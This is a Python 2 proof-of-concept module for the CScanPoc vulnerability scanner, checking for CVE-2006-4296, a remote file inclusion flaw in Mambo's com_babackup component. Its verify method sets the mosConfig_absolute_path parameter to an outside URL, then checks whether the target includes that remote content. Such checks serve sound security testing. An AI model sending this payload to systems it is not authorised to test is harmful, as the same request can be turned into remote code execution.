# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'Mambo_0000' # 平台漏洞编号
    name = 'Mambo com_babackup Component <= 1.1 File Include Vulnerability' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.RFI # 漏洞类型
    disclosure_date = '2006-08-22'  # 漏洞公布时间
    desc = '''
        Mambo com_babackup Component <= 1.1版本存在远程文件包含漏洞。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-63864' # 
    cnvd_id = 'CNVD-2006-6440' # cnvd漏洞编号
    cve_id = 'CVE-2006-4296'  # cve编号
    product = 'Mambo'  # 漏洞组件名称
    product_version = 'mambo com_babackup Component<= 1.1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c1d05ddf-6a4b-4b91-85e8-8a264b71d9c7' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=http://baidu.com/robots.txt?'
            response = requests.get(vul_url).content
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()